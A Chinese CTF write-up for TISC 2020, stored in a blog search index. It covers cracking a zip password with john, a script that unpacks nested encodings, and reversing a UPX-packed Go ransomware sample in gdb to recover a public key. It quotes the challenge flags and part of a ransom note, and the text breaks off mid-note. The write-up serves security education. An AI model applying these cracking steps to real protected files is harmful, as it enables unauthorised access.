<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>TISC 2020 CTF 题目分析及writeups</title>
    <link href="/2020/10/06/TISC-2020-CTF-%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90%E5%8F%8Awriteups/"/>
    <url>/2020/10/06/TISC-2020-CTF-%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90%E5%8F%8Awriteups/</url>
    
    <content type="html"><![CDATA[<h2 id="0x00-简介"><a href="#0x00-简介" class="headerlink" title="0x00 简介"></a>0x00 简介</h2><p>TISC(The InfoSecurity Challenge) 2020 CTF 一共包含6道题目，主要涉及密码学、二进制、逆向等知识点，部分题目之间具备一定的连续性，下面对赛事题目进行具体分析。</p><h2 id="Stage-1：What-is-this-thing"><a href="#Stage-1：What-is-this-thing" class="headerlink" title="Stage 1：What is this thing?"></a>Stage 1：What is this thing?</h2><p><img src="https://cdn.jsdelivr.net/gh/gscr10/picture/2020-9-24/1600913989660-s1-0.jpg"><br>连接服务后，指向一个zip文件连接。</p><pre class="language-txt" data-language="txt"><code class="language-txt">$$$$$$$$\ $$$$$$\  $$$$$$\   $$$$$$\\__$$  __|\_$$  _|$$  __$$\ $$  __$$\   $$ |     $$ |  $$ &#x2F;  \__|$$ &#x2F;  \__|   $$ |     $$ |  \$$$$$$\  $$ |   $$ |     $$ |   \____$$\ $$ |   $$ |     $$ |  $$\   $$ |$$ |  $$\   $$ |   $$$$$$\ \$$$$$$  |\$$$$$$  |   \__|   \______| \______&#x2F;  \______&#x2F;CSIT&#39;s The Infosecurity Challenge 2020https:&#x2F;&#x2F;play.tisc.csit-events.sg&#x2F;CHALLENGE 1: What is this thing?&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;SUBMISSION_TOKEN? LdWaGOgyfbVQromGEgmzfADJYNpGEPKLUgjiudRJfMoKzpXyklQgNqSxSQeNYGsrWe noticed unusually network activity around the time that the user reported being ransomware-d.There were files being sent and recieved, some of which we were unable to inspect.Could you try to decode this?Reminder! SAVE ANY CODE YOU WROTE &#x2F; TAKE SCREENSHOTS OF YOUR WORK, THIS WILL NEED TO BE SUBMITTED IN YOUR WRITEUP!CLARITY OF DOCUMENTATION WILL CONTRIBUTE TO A BETTER EVALUATION OF YOUR WRITEUP.The file is hosted at http:&#x2F;&#x2F;fqybysahpvift1nqtwywevlr7n50zdzp.ctf.sg:31080&#x2F;325528f1f0a95ebbcdd78180e35e2699.zip .Flag?</code></pre><p>该zip文件受到密码保护，里面包含一个名为<code>temp.mess</code>的文件：</p><pre class="language-shell" data-language="shell"><code class="language-shell">r10@kali:~/tisc$ <span class="token function">unzip</span> d9c8f641bd3cb1b7a9652e8d120ed9a8.zipArchive:  d9c8f641bd3cb1b7a9652e8d120ed9a8.zip<span class="token punctuation">[</span>d9c8f641bd3cb1b7a9652e8d120ed9a8.zip<span class="token punctuation">]</span> temp.mess password:</code></pre><p>根据题目的介绍<code>they are using a simple password (6 characters, hexadecimal) on the zip files</code>，可知解压密码为6位十六进制，采用暴力破解的方式就可以得到。在破解之前，先将zip文件转换为爆破工具john接受的格式，然后开始爆破：</p><pre class="language-shell" data-language="shell"><code class="language-shell">r10@kali:~/tisc$ zip2john d9c8f641bd3cb1b7a9652e8d120ed9a8.zip  <span class="token operator">></span> zip.hashesver <span class="token number">2.0</span> d9c8f641bd3cb1b7a9652e8d120ed9a8.zip/temp.mess PKZIP Encr: <span class="token assign-left variable">cmplen</span><span class="token operator">=</span><span class="token number">125108</span>, <span class="token assign-left variable">decmplen</span><span class="token operator">=</span><span class="token number">125056</span>, <span class="token assign-left variable">crc</span><span class="token operator">=</span>16B94B68r10@kali:~/tisc$ john --min-len<span class="token operator">=</span><span class="token number">6</span> --max-len<span class="token operator">=</span><span class="token number">6</span> --mask<span class="token operator">=</span><span class="token string">'?h?h?h?h?h?h'</span> ./zip.hashesUsing default input encoding: UTF-8Loaded <span class="token number">1</span> password <span class="token builtin class-name">hash</span> <span class="token punctuation">(</span>PKZIP <span class="token punctuation">[</span><span class="token number">32</span>/64<span class="token punctuation">]</span><span class="token punctuation">)</span>Will run <span class="token number">4</span> OpenMP threadsPress <span class="token string">'q'</span> or Ctrl-C to abort, almost any other key <span class="token keyword">for</span> statuseff650           <span class="token punctuation">(</span>d9c8f641bd3cb1b7a9652e8d120ed9a8.zip/temp.mess<span class="token punctuation">)</span>1g <span class="token number">0</span>:00:00:00 DONE <span class="token punctuation">(</span><span class="token number">2020</span>-08-08 <span class="token number">11</span>:18<span class="token punctuation">)</span> <span class="token number">25</span>.00g/s 9011Kp/s 9011Kc/s 9011KC/s 000650<span class="token punctuation">..</span>fff750Use the <span class="token string">"--show"</span> option to display all of the cracked passwords reliablySession completed</code></pre><p>得到解压密码为<code>eff650</code>。使用该密码解压，得到bzip2压缩格式的<code>temp.mess</code>文件：</p><pre class="language-shell" data-language="shell"><code class="language-shell">r10@kali:~/tisc$ <span class="token function">unzip</span> d9c8f641bd3cb1b7a9652e8d120ed9a8.zipArchive:  d9c8f641bd3cb1b7a9652e8d120ed9a8.zip<span class="token punctuation">[</span>d9c8f641bd3cb1b7a9652e8d120ed9a8.zip<span class="token punctuation">]</span> temp.mess password:  inflating: temp.mess  r10@kali:~/tisc$ <span class="token function">file</span> temp.messtemp.mess: <span class="token function">bzip2</span> compressed data, block size <span class="token operator">=</span> 900k</code></pre><p>经过几个阶段的手动提取，对文件进行分析，该文件是一个包含不同格式及编码嵌套的文件，主要包括<code>bzip2 compressed</code> <code>hex encoding</code> <code>base64 encoding</code> <code>xz compressed</code> <code>gzip compressed</code> <code>zlib compressed</code>。依据这个思路，编写解压脚本：</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> shutil<span class="token keyword">import</span> magic<span class="token keyword">import</span> os<span class="token keyword">import</span> base64<span class="token keyword">import</span> zlib<span class="token keyword">import</span> hashlib<span class="token keyword">import</span> json<span class="token keyword">def</span> <span class="token function">unpack</span><span class="token punctuation">(</span>filename<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        typed <span class="token operator">=</span> magic<span class="token punctuation">.</span>from_file<span class="token punctuation">(</span>filename<span class="token punctuation">)</span>    <span class="token keyword">except</span> Exception<span class="token punctuation">:</span>        <span class="token comment"># Problem with python2 magic</span>        typed <span class="token operator">=</span> <span class="token string">"zlib"</span>    <span class="token keyword">if</span> <span class="token string">'BS image'</span> <span class="token keyword">in</span> typed<span class="token punctuation">:</span>        typed <span class="token operator">=</span> <span class="token string">'zlib'</span>    new_filename <span class="token operator">=</span> <span class="token string">"unknown"</span>    out_file <span class="token operator">=</span> <span class="token string">"unknown"</span>    <span class="token keyword">if</span> <span class="token string">"bzip2"</span> <span class="token keyword">in</span> typed<span class="token punctuation">:</span>        new_filename <span class="token operator">=</span> <span class="token string">'&#123;&#125;b.bz2'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>filename<span class="token punctuation">)</span>        shutil<span class="token punctuation">.</span>copy<span class="token punctuation">(</span>filename<span class="token punctuation">,</span> new_filename<span class="token punctuation">)</span>        os<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">"bzip2 -d &#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>new_filename<span class="token punctuation">)</span><span class="token punctuation">)</span>        out_file <span class="token operator">=</span> <span class="token string">'&#123;&#125;b'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>filename<span class="token punctuation">)</span>    <span class="token keyword">elif</span> <span class="token string">"ASCII text"</span> <span class="token keyword">in</span> typed<span class="token punctuation">:</span>        data <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span>filename<span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> data<span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> data<span class="token punctuation">:</span>            new_filename <span class="token operator">=</span> <span class="token string">'&#123;&#125;h'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>filename<span class="token punctuation">)</span>            <span class="token builtin">open</span><span class="token punctuation">(</span>new_filename<span class="token punctuation">,</span> <span class="token string">'wb'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token builtin">bytes</span><span class="token punctuation">.</span>fromhex<span class="token punctuation">(</span>data<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">"ascii"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            out_file <span class="token operator">=</span> new_filename        <span class="token keyword">else</span><span class="token punctuation">:</span>            new_filename <span class="token operator">=</span> <span class="token string">'&#123;&#125;f'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>filename<span class="token punctuation">)</span>            <span class="token builtin">open</span><span class="token punctuation">(</span>new_filename<span class="token punctuation">,</span> <span class="token string">'wb'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>write<span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span>            out_file <span class="token operator">=</span> new_filename    <span class="token keyword">elif</span> <span class="token string">"XZ compressed"</span> <span class="token keyword">in</span> typed<span class="token punctuation">:</span>        new_filename <span class="token operator">=</span> <span class="token string">'&#123;&#125;x.xz'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>filename<span class="token punctuation">)</span>        shutil<span class="token punctuation">.</span>copy<span class="token punctuation">(</span>filename<span class="token punctuation">,</span> new_filename<span class="token punctuation">)</span>        os<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">"xz -d &#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>new_filename<span class="token punctuation">)</span><span class="token punctuation">)</span>        out_file <span class="token operator">=</span> <span class="token string">'&#123;&#125;x'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>filename<span class="token punctuation">)</span>    <span class="token keyword">elif</span> <span class="token string">"gzip"</span> <span class="token keyword">in</span> typed<span class="token punctuation">:</span>        new_filename <span class="token operator">=</span> <span class="token string">'&#123;&#125;g.gz'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>filename<span class="token punctuation">)</span>        shutil<span class="token punctuation">.</span>copy<span class="token punctuation">(</span>filename<span class="token punctuation">,</span> new_filename<span class="token punctuation">)</span>        os<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">"gzip -d &#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>new_filename<span class="token punctuation">)</span><span class="token punctuation">)</span>        out_file <span class="token operator">=</span> <span class="token string">'&#123;&#125;g'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>filename<span class="token punctuation">)</span>    <span class="token keyword">elif</span> <span class="token string">"zlib"</span> <span class="token keyword">in</span> typed<span class="token punctuation">:</span>        data <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span>filename<span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>        new_filename <span class="token operator">=</span> <span class="token string">'&#123;&#125;z'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>filename<span class="token punctuation">)</span>        out_file <span class="token operator">=</span> new_filename        <span class="token builtin">open</span><span class="token punctuation">(</span>out_file<span class="token punctuation">,</span> <span class="token string">'wb'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>write<span class="token punctuation">(</span>zlib<span class="token punctuation">.</span>decompress<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">elif</span> <span class="token string">'JSON'</span> <span class="token keyword">in</span> typed<span class="token punctuation">:</span>        data <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span>filename<span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Flag!"</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> out_file<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    current <span class="token operator">=</span> <span class="token string">'temp.mess_'</span>    os<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">"rm temp.mess_*"</span><span class="token punctuation">)</span>    shutil<span class="token punctuation">.</span>copy<span class="token punctuation">(</span><span class="token string">'temp.mess'</span><span class="token punctuation">,</span> <span class="token string">'temp.mess_'</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        next_file <span class="token operator">=</span> unpack<span class="token punctuation">(</span>current<span class="token punctuation">)</span>        <span class="token comment">#print('&#123;&#125; -> &#123;&#125;'.format(current, next_file))</span>        current <span class="token operator">=</span> next_file        <span class="token keyword">if</span> current <span class="token operator">==</span> <span class="token string">'unknown'</span><span class="token punctuation">:</span>            <span class="token keyword">return</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    main<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>执行解压脚本得到flag：</p><pre class="language-shell" data-language="shell"><code class="language-shell">r10@kali:~/tisc$ python solver.pyrm: temp.mess_*: No such <span class="token function">file</span> or directoryFlag<span class="token operator">!</span><span class="token punctuation">&#123;</span><span class="token string">'anoroc'</span><span class="token builtin class-name">:</span> <span class="token string">'v1.320'</span>, <span class="token string">'secret'</span><span class="token builtin class-name">:</span> <span class="token string">'TISC20&#123;q1_d06fd09ff9a27ec499df9caf42923bce&#125;'</span>, <span class="token string">'desc'</span><span class="token builtin class-name">:</span> <span class="token string">'Submit this.secret to the TISC grader to complete challenge'</span>, <span class="token string">'constants'</span><span class="token builtin class-name">:</span> <span class="token punctuation">[</span><span class="token number">1116352408</span>, <span class="token number">1899447441</span>, <span class="token number">3049323471</span>, <span class="token number">3921009573</span>, <span class="token number">961987163</span>, <span class="token number">1508970993</span>, <span class="token number">2453635748</span>, <span class="token number">2870763221</span><span class="token punctuation">]</span>, <span class="token string">'sign'</span><span class="token builtin class-name">:</span> <span class="token string">'cx-1FpeoEgqkk2HN70RCmRU'</span><span class="token punctuation">&#125;</span></code></pre><p><strong>Flag:</strong> <code>TISC20&#123;q1_d06fd09ff9a27ec499df9caf42923bce&#125;</code></p><h2 id="Stage-2：Find-me-some-keys"><a href="#Stage-2：Find-me-some-keys" class="headerlink" title="Stage 2：Find me some keys"></a>Stage 2：Find me some keys</h2><p><img src="https://cdn.jsdelivr.net/gh/gscr10/picture/2020-9-24/1600914021085-s2-0.jpg"><br>通过题目介绍可知，需要寻找一个完整的base64编码的公共秘钥：</p><pre class="language-txt" data-language="txt"><code class="language-txt">The key file will look something like this but longer:LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0NCmMyOXRaU0JpWVhObE5qUWdjM1J5YVc1bklHZHZaWE1nYUdWeVpRPT0NCi0tLS0tRU5EIFBVQkxJQyBLRVktLS0tLQ&#x3D;&#x3D;</code></pre><p>这里提供了一个名为<code>encrypted.zip</code> 的文件，解压得到一些docker文件，并且被后缀<code>.anoroc</code>加密：</p><pre class="language-shell" data-language="shell"><code class="language-shell">r10@kali:~/tisc$ <span class="token function">unzip</span> encrypted.zipArchive:  encrypted.zip   creating: dockerize/  inflating: dockerize/Dockerfile  inflating: dockerize/anorocware   creating: dockerize/encrypted/ extracting: dockerize/encrypted/secret_investments.db.anoroc   creating: dockerize/encrypted/images/  inflating: dockerize/encrypted/images/slopes.png.anoroc  inflating: dockerize/encrypted/images/lake.jpg.anoroc  inflating: dockerize/encrypted/images/ridge.png.anoroc  inflating: dockerize/encrypted/images/rocks.jp2.anoroc  inflating: dockerize/encrypted/images/rollinginthed33p.png.anoroc  inflating: dockerize/encrypted/images/yummy.png.anoroc   creating: dockerize/encrypted/email/ extracting: dockerize/encrypted/email/aqec62y3.txt.anoroc<span class="token punctuation">..</span>. extracting: dockerize/encrypted/email/_7zp3gmy.txt.anoroc extracting: dockerize/encrypted/keydetails-enc.txt extracting: dockerize/encrypted/clients.db.anoroc  inflating: dockerize/encrypted/ransomnote-anoroc.txt</code></pre><p>通过分析，二进制的勒索文件<code>anorocware</code>是一个重要线索，该文件格式为<code>64-bit ELF</code>：</p><pre class="language-shell" data-language="shell"><code class="language-shell">r10@kali:~/tisc$ <span class="token function">file</span> anorocwareanorocware: ELF <span class="token number">64</span>-bit LSB executable, x86-64, version <span class="token number">1</span> <span class="token punctuation">(</span>SYSV<span class="token punctuation">)</span>, statically linked, stripped</code></pre><p>查询该文件中包含是字符串，发现为UPX打包：</p><pre class="language-shell" data-language="shell"><code class="language-shell">r10@kali:~/tisc$ strings -a anorocware <span class="token operator">|</span> <span class="token function">grep</span> <span class="token string">'packed'</span><span class="token variable">$Info</span><span class="token builtin class-name">:</span> This <span class="token function">file</span> is packed with the UPX executable packer http://upx.sf.net $</code></pre><p>利用<code>ups</code>工具解压：</p><pre class="language-shell" data-language="shell"><code class="language-shell">r10@kali:~/tisc$ upx -d anorocware                       Ultimate Packer <span class="token keyword">for</span> eXecutables                          Copyright <span class="token punctuation">(</span>C<span class="token punctuation">)</span> <span class="token number">1996</span> - <span class="token number">2017</span>UPX <span class="token number">3.94</span>        Markus Oberhumer, Laszlo Molnar <span class="token operator">&amp;</span> John Reiser   May 12th <span class="token number">2017</span>        File size         Ratio      Format      Name   --------------------   ------   -----------   -----------   <span class="token number">7406375</span> <span class="token operator">&lt;</span>-   <span class="token number">3993332</span>   <span class="token number">53.92</span>%   linux/amd64   anorocwareUnpacked <span class="token number">1</span> file.</code></pre><p>解压出的文件是用go编译的二进制文件，我们可以放入<code>Ghidra</code> 或者<code>Binary Ninja</code>中进行分析。为了寻找base64编码的公钥，可以定位到文件中解码base64字符串的位置。数据通过<code>main.EncryptDecrypt</code>函数，然后传递到<code>encoding/base64.(*Encoding).DecodeString</code>函数中：<br><img src="https://cdn.jsdelivr.net/gh/gscr10/picture/2020-9-24/1600913997192-s2-1.jpg"></p><p>在<code>0x662175</code>处放置断点，寻找base64编码的字符串：</p><pre class="language-shell" data-language="shell"><code class="language-shell">r10@kali:~/tisc$ gdb ./anorocwareGNU gdb <span class="token punctuation">(</span>Ubuntu <span class="token number">8.1</span>-0ubuntu3.2<span class="token punctuation">)</span> <span class="token number">8.1</span>.0.20180409-gitCopyright <span class="token punctuation">(</span>C<span class="token punctuation">)</span> <span class="token number">2018</span> Free Software Foundation, Inc.License GPLv3+: GNU GPL version <span class="token number">3</span> or later <span class="token operator">&lt;</span>http://gnu.org/licenses/gpl.html<span class="token operator">></span>This is <span class="token function">free</span> software: you are <span class="token function">free</span> to change and redistribute it.There is NO WARRANTY, to the extent permitted by law.  Type <span class="token string">"show copying"</span>and <span class="token string">"show warranty"</span> <span class="token keyword">for</span> details.This GDB was configured as <span class="token string">"x86_64-linux-gnu"</span><span class="token builtin class-name">.</span><span class="token punctuation">..</span>.gef<span class="token operator">></span>  br *0x662175Breakpoint <span class="token number">1</span> at 0x662175: <span class="token function">file</span> /home/hjf98/Documents/CSPC2020Dev/goware/main.go, line <span class="token number">246</span>.</code></pre><p>调试运行后，检查堆栈中的值，找到匹配的字符串：<br><img src="https://cdn.jsdelivr.net/gh/gscr10/picture/2020-9-24/1600913997194-s2-2.jpg"></p><pre class="language-none"><code class="language-none">gef&gt;  x&#x2F;s $rcx0xc000435000:&quot;LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlJRUlEQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0JBMEFNSUlFQ0FLQ0JBRUFtOTliMnB2dHJWaVcrak4vM05GZgp3OGczNmRRUjZpSnIrY3lSZStrOFhGenVIVU80TE4zdGs3NnRGUzhEYmFDY1lGaXVmOEdzdWdjUm1RREVyUFpmCnFna3ZYWnB1ZmZmVGZqVEIramUvV2k0M2J3THF0dzBXNGNYb1BXMzN1R1ZhV1pYMG9MektDL0F4Zzdrd0l0bUcKeG5uMzIxVEFqRVpnVGJMK09hTmtjSHpmUTdVendhRXA5VVB0VDhwR1lvTkpIbFgzZmtGcTJpVnk3N3VJNGdSSwpNZjh1alRma0lISGpRN0JFemdFZ2s4a3F4R2FTUGxJTlFzNjVQNHR2T3BpaHFwd1VWcEFqUExOQlR0OUh6MUYvCmZSK2FEc0pRUktaTk1yV1JMdU1ZaU8yTXg5Y1pCbnd6TDlLdUZSdkhlbE83QldheVU5ZjBYT3BnL3p5YkVRT0wKdXgram1zVXNUc1Fiaks5Y0I2N01hMjFEK1hKSHlLZ0t1UDl1MTRtVkNaZ0NCazlseWJTMWJ4ZHZGRFFQZ2t5YwpNM3o5dnV1Y0NVMUV1MkQwbGhGbUozRlFmWmtBWSsrWEhVcGl3dWk5Tk8zQTlVRzdhbXlYYk9TY2xGMlg5a1JxCjBDd21xT3RCUkJFV0lTZTVyZHpjL0FUT1AzUHFEakd3eVNYeFdaRENIOHJyZ256V3B2MkxyaVlRVG5mMmNFMEcKL2lJOFJ3allvR0xXemVMVlJyMWhoWjhZNXM0Ui9zUjQ5N1dlbmtSY3BPTE9rRFZnZTdNdXNUT1doNGVOaTRnbwpQbGRzaVlUcVRuZEExd1Y2N3IwOXVqcHA4VnZwZEx1bys0aCs3cC9wZnBYTXN4OGRBTG9tNHNma1ljSkhoT2JrCnh0NUNwTkNrVlhoNXRzR2hlRmI3djg1R2lORnkxN3p1YWxNZGEzMkJpblBlRWJGcnFLd0QyWjRSNVFnUXVCOHUKSXdqcVNUZ05vOVV2dmNoNmxXQ2JqOWUrODB1Z1Y0bzdqSENkLzU2Rmt1dmhDcWlJTmRaRFVVNFpCMzdoZGVsZgplRTlOYnhEaktHOFY3YUNkd3FKSkRZR2l6LzNqbXVDZkIvazVGa29IU0FOZ2JMRTBBNVNtazNUOHR1djhTeitmCnY0cnJQeG1wbjhYMlNtMUZveitVMEJXelArVkxtcExubnlYa3JPSHluOGxKRmJuL1U1TldHUkxuK2V2MkNTa3cKQUkvVGZIQUxxVHZqcWxHUXhUVGFZN1pua241aStEMUx6dEs4Y3BTWlhkRFZvUmgrL3ZNSUVpTnVrOCsrL3M2YQpITmQ3d3VGa1kvWjhqakoxakgvY3NGMzdtR1lBVXhwMzJuUms1d1JwL2M2ZVdaUE0rekdpYmZFbm1GVzV5VUVVClliWDRoenpHcjVRNmYvc3lzdXpoYXlsV2kzWEN2SXJINkxCakZOdTNVSjBWSXpjSk4wa3hhQUJhWFk4SlVEWVgKdFhVTGlwdlVPcWt0dE9xSlN4T1hXZzcyU1dLTEt2L1F2ZkRSVlhlZFVrMDY2azdSTDFva3BiTW53WWxmWWc3SgptcFpaUjJDTk53Yk1rUW0yVG1yQS9NWnVkdnF0c1g5UHBrZ0pJK1pXalV3VnRHUlVUZERNeFpXeDRIM25lSml5CjhtOHVkazQyUk4wajNuMHdWWHNXdDZRbXk3YlFzSFlYSUhVZ2tCWFl6ZHkvdStOb2RLQWpoZFZwaUpiekluY3oKU2RvbFhpbmlLd05VTFc4VmpqUzlLVFNSd2lkcWVPa2twTmVJcWlSbldUM1RUTUFNemI1ajBqRUdGN0wzRE9NUAo2UUlCQXc9PQotLS0tLUVORCBQVUJMSUMgS0VZLS0tLS0K&quot;</code></pre><p>对该字符串解码，得到公钥，然后用SHA256进行哈希散列得到flag：</p><pre class="language-shell" data-language="shell"><code class="language-shell">r10@kali:~/tisc$ public_key <span class="token operator">|</span> base64 -d-----BEGIN PUBLIC KEY-----MIIEIDANBgkqhkiG9w0BAQEFAAOCBA0AMIIECAKCBAEAm99b2pvtrViW+jN/3NFfw8g36dQR6iJr+cyRe+k8XFzuHUO4LN3tk76tFS8DbaCcYFiuf8GsugcRmQDErPZfqgkvXZpufffTfjTB+je/Wi43bwLqtw0W4cXoPW33uGVaWZX0oLzKC/Axg7kwItmGxnn321TAjEZgTbL+OaNkcHzfQ7UzwaEp9UPtT8pGYoNJHlX3fkFq2iVy77uI4gRKMf8ujTfkIHHjQ7BEzgEgk8kqxGaSPlINQs65P4tvOpihqpwUVpAjPLNBTt9Hz1F/fR+aDsJQRKZNMrWRLuMYiO2Mx9cZBnwzL9KuFRvHelO7BWayU9f0XOpg/zybEQOLux+jmsUsTsQbjK9cB67Ma21D+XJHyKgKuP9u14mVCZgCBk9lybS1bxdvFDQPgkycM3z9vuucCU1Eu2D0lhFmJ3FQfZkAY++XHUpiwui9NO3A9UG7amyXbOSclF2X9kRq0CwmqOtBRBEWISe5rdzc/ATOP3PqDjGwySXxWZDCH8rrgnzWpv2LriYQTnf2cE0G/iI8RwjYoGLWzeLVRr1hhZ8Y5s4R/sR497WenkRcpOLOkDVge7MusTOWh4eNi4goPldsiYTqTndA1wV67r09ujpp8VvpdLuo+4h+7p/pfpXMsx8dALom4sfkYcJHhObkxt5CpNCkVXh5tsGheFb7v85GiNFy17zualMda32BinPeEbFrqKwD2Z4R5QgQuB8uIwjqSTgNo9Uvvch6lWCbj9e+80ugV4o7jHCd/56FkuvhCqiINdZDUU4ZB37hdelfeE9NbxDjKG8V7aCdwqJJDYGiz/3jmuCfB/k5FkoHSANgbLE0A5Smk3T8tuv8Sz+fv4rrPxmpn8X2Sm1Foz+U0BWzP+VLmpLnnyXkrOHyn8lJFbn/U5NWGRLn+ev2CSkwAI/TfHALqTvjqlGQxTTaY7Znkn5i+D1LztK8cpSZXdDVoRh+/vMIEiNuk8++/s6aHNd7wuFkY/Z8jjJ1jH/csF37mGYAUxp32nRk5wRp/c6eWZPM+zGibfEnmFW5yUEUYbX4hzzGr5Q6f/sysuzhaylWi3XCvIrH6LBjFNu3UJ0VIzcJN0kxaABaXY8JUDYXtXULipvUOqkttOqJSxOXWg72SWKLKv/QvfDRVXedUk066k7RL1okpbMnwYlfYg7JmpZZR2CNNwbMkQm2TmrA/MZudvqtsX9PpkgJI+ZWjUwVtGRUTdDMxZWx4H3neJiy8m8udk42RN0j3n0wVXsWt6Qmy7bQsHYXIHUgkBXYzdy/u+NodKAjhdVpiJbzInczSdolXiniKwNULW8VjjS9KTSRwidqeOkkpNeIqiRnWT3TTMAMzb5j0jEGF7L3DOMP<span class="token assign-left variable">6QIBAw</span><span class="token operator">==</span>-----END PUBLIC KEY-----r10@kali:~/tisc$ <span class="token builtin class-name">printf</span> <span class="token string">"TISC20&#123;%s&#125;"</span> <span class="token variable"><span class="token variable">$(</span>public_key <span class="token operator">|</span> shasum -a <span class="token number">256</span> <span class="token operator">|</span> <span class="token function">cut</span> -d<span class="token string">' '</span> -f <span class="token number">1</span><span class="token variable">)</span></span>TISC20<span class="token punctuation">&#123;</span>8eaf2d08d5715eec34be9ac4bf612e418e64da133ce8caba72b90faacd43ceee<span class="token punctuation">&#125;</span></code></pre><p><strong>Flag:</strong> <code>TISC20&#123;8eaf2d08d5715eec34be9ac4bf612e418e64da133ce8caba72b90faacd43ceee&#125;</code></p><h2 id="STAGE-3-Recover-some-files"><a href="#STAGE-3-Recover-some-files" class="headerlink" title="STAGE 3: Recover some files"></a>STAGE 3: Recover some files</h2><p><img src="https://cdn.jsdelivr.net/gh/gscr10/picture/2020-9-24/1600914170260-s3-0.jpg"></p><p>这一关需要对Stage 2提供的<code>encrypted.zip</code>文件中被加密的文件进行解密。为了达到这个目的，我们需要了解勒索文件<code>anorocware</code>的内部运行流程。对<code>main.mian</code>进行检查，可以发现赎金条(ransom note)被写入<code>ransomnote-anoroc.txt</code>文件中:<br><img src="https://cdn.jsdelivr.net/gh/gscr10/picture/2020-9-24/1600914323463-s3-1.jpg"></p><p>赎金条包含一个先前计算的<code>machineid.ID()</code>:</p><pre class="language-txt" data-language="txt"><code class="language-txt">$$$$$$$$\ $$$$$$\  $$$$$$\   $$$$$$\\__$$  __|\_$$  _|$$  __$$\ $$  __$$\   $$ |     $$ |  $$ &#x2F;  \__|$$ &#x2F;  \__|   $$ |     $$ |  \$$$$$$\  $$ |   $$ |     $$ |   \____$$\ $$ |   $$ |     $$ |  $$\   $$ |$$ |  $$\   $$ |   $$$$$$\ \$$$$$$  |\$$$$$$  |   \__|   \______| \______&#x2F;  \______&#x2F;Hello Sir &#x2F; Madam,Your computer has been hax0red and your files are now to belong to me.We use military grade cryptography code to encrypt ur filez.Do not try anything stupid, u will lose ur beloved data.You have 48 hours to pay 1 Ethereum (ETH) to 0xc184e8BB0c8AA7326056D21C4Badf3eE58f04af2.Email divoc-91@protonmail.ch proof of your transaction to obtain your decryption keys.PLEASE INCLUDE YOUR MACHINE-ID &#x3D; 